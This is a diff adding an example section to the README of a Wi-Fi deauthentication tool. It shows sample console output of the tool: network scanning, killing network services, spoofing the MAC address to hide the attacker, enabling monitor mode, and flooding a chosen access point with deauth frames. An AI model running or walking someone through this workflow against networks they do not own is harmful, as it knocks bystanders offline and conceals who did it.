@@ -57,6 +57,113 @@ Confirm the channel and start the attack. 💣
 
 Hit Ctrl+C to stop the attack and clean everything up. 🔚
 
+## Exemple on ubuntu
+```bash
+██╗    ██╗██╗      ███████╗██╗    ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
+██║    ██║██║      ██╔════╝██║    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
+██║ █╗ ██║██║█████╗█████╗  ██║    █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
+██║███╗██║██║╚════╝██╔══╝  ██║    ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
+╚███╔███╔╝██║      ██║     ██║    ██║  ██╗██║███████╗███████╗███████╗██║  ██║
+ ╚══╝╚══╝ ╚═╝      ╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
+                                                                       by: abdo3Dr 
+[!] Wi-Fi Deauthentication Script [!]                
+    For educational purposes only!
+    Use at your own risk on your own network!
+    I am not responsible for any misuse!
+
+**************************************************
+[INFO] Scan networks and launch deauth attack.
+[WARNING] Only use this on networks you own!
+**************************************************
+lo        no wireless extensions.
+
+eno1      no wireless extensions.
+
+wlp2s0    IEEE 802.11  ESSID:"<HIDDEN_SSID>"  
+          Mode:Managed  Frequency:2.412 GHz  Access Point: <HIDDEN_BSSID>   
+          Bit Rate=58.5 Mb/s   Tx-Power=15 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Encryption key:off
+          Power Management:on
+          Link Quality=46/70  Signal level=-64 dBm  
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:97   Missed beacon:0
+
+docker0   no wireless extensions.
+
+[?] Enter your INTERFACE: wlp2s0
++-------------------+----------------------------+---------+-----------------------+------------+
+|       BSSID       |            SSID            | Channel | Signal Strength (dBm) | Encryption |
++-------------------+----------------------------+---------+-----------------------+------------+
+| <HIDDEN_BSSID>    |        <HIDDEN_SSID_1>      |   48    |          -77          |    Yes     |
+| <HIDDEN_BSSID>    |      <HIDDEN_SSID_2>       |   11    |          -57          |    Yes     |
+| <HIDDEN_BSSID>    |         <HIDDEN_SSID_3>    |    9    |          -73          |    Yes     |
+| <HIDDEN_BSSID>    |    <HIDDEN_SSID_4>         |    3    |          -54          |    Yes     |
+| <HIDDEN_BSSID>    |        <HIDDEN_SSID_5>     |    1    |          -65          |    Yes     |
+| <HIDDEN_BSSID>    |     <HIDDEN_SSID_6>        |    2    |          -71          |    Yes     |
+| <HIDDEN_BSSID>    |    <HIDDEN_SSID_7>         |    6    |          -79          |    Yes     |
+| <HIDDEN_BSSID>    |           <HIDDEN_SSID_8>  |    6    |          -79          |    Yes     |
+| <HIDDEN_BSSID>    |           <HIDDEN_SSID_9>  |    7    |          -81          |    Yes     |
+| <HIDDEN_BSSID>    | <HIDDEN_SSID_10>           |    1    |          -87          |    Yes     |
+| <HIDDEN_BSSID>    |           <HIDDEN_SSID_11> |   40    |          -86          |    Yes     |
++-------------------+----------------------------+---------+-----------------------+------------+
+
+ [?] Enter the Wi-Fi BSSID to attack: <HIDDEN_BSSID>
+Disconnecting from the AP...
+[*] Killing interfering processes...
+
+Killing these processes:
+
+    PID Name
+  30183 NetworkManager
+  30193 wpa_supplicant
+  30839 avahi-daemon
+  30842 avahi-daemon
+
+[*] Anonymizing MAC address...
+Current MAC:   <HIDDEN_MAC> (unknown)
+Permanent MAC: <HIDDEN_MAC> (Intel Corporate)
+New MAC:       <HIDDEN_MAC> (unknown)
+[+] MAC address anonymized.
+[*] Enabling monitor mode on wlp2s0...
+
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+  30858 avahi-daemon
+  30860 avahi-daemon
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlp2s0		iwlwifi		Intel Corporation Centrino Advanced-N 6200 (rev 35)
+		(monitor mode enabled)
+
+[+] Monitor mode enabled on wlp2s0.
+Changing channel to 11...
+Sending deauthentication packets to BSSID: <HIDDEN_BSSID>
+06:46:28  Waiting for beacon frame (BSSID: <HIDDEN_BSSID>) on channel 11
+NB: this attack is more effective when targeting
+a connected wireless client (-c <client's mac>).
+06:46:28  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+06:46:28  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+06:46:29  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+06:46:29  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+06:46:30  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+06:46:30  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+06:46:31  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+06:46:31  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+06:46:32  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+06:46:32  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+06:46:32  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+06:46:33  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+06:46:33  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+06:46:34  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+06:46:34  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+06:46:35  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
+```
 ⚠️ Important Notes
 Run as root: You need admin privileges to make this work. (sudo is your friend) 🧑‍💻
 Be responsible: Don't mess with networks you don't own. 🚫
